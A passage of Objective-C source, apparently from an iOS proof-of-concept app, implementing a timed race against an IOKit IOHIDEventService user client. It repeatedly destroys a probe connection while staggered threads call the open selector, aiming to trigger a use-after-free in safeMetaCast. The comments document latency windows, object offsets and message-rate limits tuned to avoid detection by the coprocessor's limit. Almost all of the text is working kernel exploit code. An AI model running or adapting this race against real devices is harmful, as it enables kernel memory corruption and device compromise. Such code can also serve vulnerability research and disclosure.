///      → UAF: safeMetaCast dereferences a freed object in the SPU collection.
///
/// SPU BUDGET per attempt:
///   1 probe open + 1 probe close + up to 6 racer opens + racer cleanups
///   Total: ~8-14 SPU messages per attempt over ~2s = 4-7 msgs/s
///   AOP limit: ~140 msgs/s. We are 20x under the limit.
///
/// PEAK BURST:
///   1 close + 1-2 opens within 2ms = 2-3 msgs. Outbox can handle this easily.
///
- (void)precisionRaceTapped {
    self.triggerButton.enabled = NO;
    self.termRaceOnlyButton.enabled = NO;
    self.uafFocusButton.enabled = NO;
    self.precisionButton.enabled = NO;
    [self appendLog:@"\n========== Surgical Strike Race =========="];
    [self appendLog:@"1 probe + 6 staggered racers, mach_wait_until precision"];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.triggerButton.enabled = YES;
            self.termRaceOnlyButton.enabled = YES;
            self.uafFocusButton.enabled = YES;
            self.precisionButton.enabled = YES;
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        io_service_t svc = [self findGateableService];
        if (svc == MACH_PORT_NULL) {
            [self appendLog:@"FAIL: no gateable IOHIDEventService found"];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.triggerButton.enabled = YES;
                self.termRaceOnlyButton.enabled = YES;
                self.uafFocusButton.enabled = YES;
                self.precisionButton.enabled = YES;
            });
            return;
        }

        const char *xml = kOpenPropertiesXML;
        const size_t xmlLen = strlen(xml) + 1;

        // ---- Tuning ----
        const int kRacerCount = 6;
        // Stagger offsets in microseconds after mach_port_destroy.
        // Covers the typical didTerminate latency range (1-11ms).
        // Non-linear spacing: denser in the 2-6ms peak probability zone.
        const useconds_t kStaggerUs[6] = { 1000, 2500, 4000, 6000, 8000, 11000 };
        const useconds_t kProbeSettleUs  = 20000;   // 20ms after probe open
        const useconds_t kPostRaceUs     = 30000;   // 30ms after racers finish
        const useconds_t kCleanupDelayUs = 100000;  // 100ms between successful racer cleanups
        const useconds_t kCooldownUs     = 400000;  // 400ms between attempts
        const NSTimeInterval kDuration   = 300.0;   // 5 minutes

        // Mach timebase for mach_wait_until precision
        mach_timebase_info_data_t tbi;
        mach_timebase_info(&tbi);
        // mach_time = microseconds * 1000 * denom / numer
        double usToMach = 1000.0 * (double)tbi.denom / (double)tbi.numer;

        // Concurrent queue for parallel racer dispatch
        dispatch_queue_t racerQueue = dispatch_queue_create(
            "com.poc.surgical.racers",
            dispatch_queue_attr_make_with_qos_class(
                DISPATCH_QUEUE_CONCURRENT, QOS_CLASS_USER_INTERACTIVE, 0));

        [self appendLog:[NSString stringWithFormat:
            @"  racers=%d, stagger=[%d-%d]ms, cooldown=%dms, duration=%ds",
            kRacerCount, kStaggerUs[0] / 1000, kStaggerUs[kRacerCount - 1] / 1000,
            kCooldownUs / 1000, (int)kDuration]];

        int attemptCount = 0;
        int totalRacerOpens = 0;
        int probeFailCount = 0;
        NSDate *start = [NSDate date];

        while ([[NSDate date] timeIntervalSinceDate:start] < kDuration) {
            attemptCount++;

            // ======== Step 1: Create and open ONE probe ========
            // This adds one entry to the SPU provider's internal collection.
            // Cost: 1 SPU openForClient message.
            io_connect_t probe = MACH_PORT_NULL;
            kern_return_t kr = sIOServiceOpen(svc, mach_task_self_, 2, &probe);
            if (kr != KERN_SUCCESS || probe == MACH_PORT_NULL) {
                probeFailCount++;
                usleep(200000);
                continue;
            }
            uint64_t s = 0;
            kr = sIOConnectCallMethod(probe, kSelectorOpen,
                &s, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
            if (kr != KERN_SUCCESS) {
                // sel0 failed — provider might be busy, retry later
                mach_port_destroy(mach_task_self(), probe);
                probeFailCount++;
                usleep(200000);
                continue;
            }

            // Let SPU fully process the probe's openForClient
            usleep(kProbeSettleUs);

            // ======== Step 2: Pre-create racers (zero SPU messages) ========
            // IOServiceOpen creates the UserClient and calls start().
            // The racer's [self+0x108] = 0 (fresh), so its first sel0 will
            // pass the exclusivity check and call openForClient.
            // NO SPU messages until we send sel0.
            //
            // Heap-allocated so blocks can capture the pointers.
            io_connect_t *racers = (io_connect_t *)calloc(kRacerCount, sizeof(io_connect_t));
            kern_return_t *racerResults = (kern_return_t *)calloc(kRacerCount, sizeof(kern_return_t));
            int racerCount = 0;
            for (int r = 0; r < kRacerCount; r++) {
                racerResults[r] = -1;
                kr = sIOServiceOpen(svc, mach_task_self_, 2, &racers[r]);
                if (kr == KERN_SUCCESS && racers[r] != MACH_PORT_NULL) {
                    racerCount++;
                } else {
                    racers[r] = MACH_PORT_NULL;
                }
            }
            if (racerCount == 0) {
                mach_port_destroy(mach_task_self(), probe);
                free(racers);
                free(racerResults);
                usleep(200000);
                continue;
            }

            // ======== Step 3: Destroy probe (async closeForClient) ========
            // mach_port_destroy → IOKit port death notification → clientClose
            // → terminate() [async] → termination thread → didTerminate
            // → close_impl → closeForClient (sends 1 SPU close message)
            // Total latency: ~1-10ms from this call returning.
            //
            // closeForClient modifies the SPU provider's internal collection
            // on the termination thread WITHOUT holding the command gate.
            mach_port_destroy(mach_task_self(), probe);
            uint64_t destroyTime = mach_absolute_time();

            // ======== Step 4: Staggered racer sel0 on parallel threads ========
            // Each racer fires openForClient at a different time offset,
            // precisely covering the didTerminate latency window.
            // openForClient iterates the same SPU collection that closeForClient
            // is modifying. If they overlap → UAF at safeMetaCast+0x1c.
            //
            // Using dispatch_group + mach_wait_until for sub-ms precision.
            // Each racer runs on its own thread (concurrent queue).
            dispatch_group_t raceGroup = dispatch_group_create();

            for (int r = 0; r < racerCount; r++) {
                int idx = r;
                uint64_t targetMach = destroyTime + (uint64_t)(kStaggerUs[idx] * usToMach);
                dispatch_group_async(raceGroup, racerQueue, ^{
                    mach_wait_until(targetMach);
                    uint64_t rs = 0;
                    racerResults[idx] = sIOConnectCallMethod(racers[idx], kSelectorOpen,
                        &rs, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
                });
            }

            // Wait for all racers (max 30ms — racers should finish within ~12ms)
            dispatch_group_wait(raceGroup, dispatch_time(DISPATCH_TIME_NOW,
                30 * NSEC_PER_MSEC));

            // Count successful racer opens
            int racerOpens = 0;
            for (int r = 0; r < racerCount; r++) {
                if (racerResults[r] == KERN_SUCCESS) racerOpens++;
            }
            totalRacerOpens += racerOpens;

            // ======== Step 5: Wait for pending termination to finish ========
            usleep(kPostRaceUs);

            // ======== Step 6: Cleanup racers ========
            // Racers whose sel0 succeeded → their [self+0x170] is set
            // → termination will call closeForClient (1 SPU close each)
            // → stagger with delay to avoid outbox burst.
            // Racers whose sel0 failed → [self+0x170] = 0
            // → termination skips closeForClient (zero SPU messages)
            // → safe to destroy immediately.
            for (int r = 0; r < racerCount; r++) {
                if (racers[r] != MACH_PORT_NULL) {
                    mach_port_destroy(mach_task_self(), racers[r]);
                    if (racerResults[r] == KERN_SUCCESS) {
                        usleep(kCleanupDelayUs); // SPU close pending, let it drain
                    }
                }
            }
            free(racers);
            free(racerResults);

            // ======== Step 7: Cooldown ========
            usleep(kCooldownUs);

            // Periodic status
            if (attemptCount % 10 == 0) {
                NSTimeInterval elapsed = [[NSDate date] timeIntervalSinceDate:start];
                double rate = (double)attemptCount / elapsed;
                [self appendLog:[NSString stringWithFormat:
                    @"  attempt %d: %d racer opens total, %.1f att/s, %.0fs elapsed",
                    attemptCount, totalRacerOpens, rate, elapsed]];
            }
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSinceDate:start];
        [self appendLog:[NSString stringWithFormat:
            @"\n  Surgical: %d attempts, %d racer opens, %d probe fails in %.1fs",
            attemptCount, totalRacerOpens, probeFailCount, elapsed]];

        sIOObjectRelease(svc);

        [self appendLog:@"\n========== Done =========="];
        [self appendLog:@"If still alive, race window not hit. Re-run to retry."];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.triggerButton.enabled = YES;
            self.termRaceOnlyButton.enabled = YES;
            self.uafFocusButton.enabled = YES;
            self.precisionButton.enabled = YES;
        });
    });
}

@end
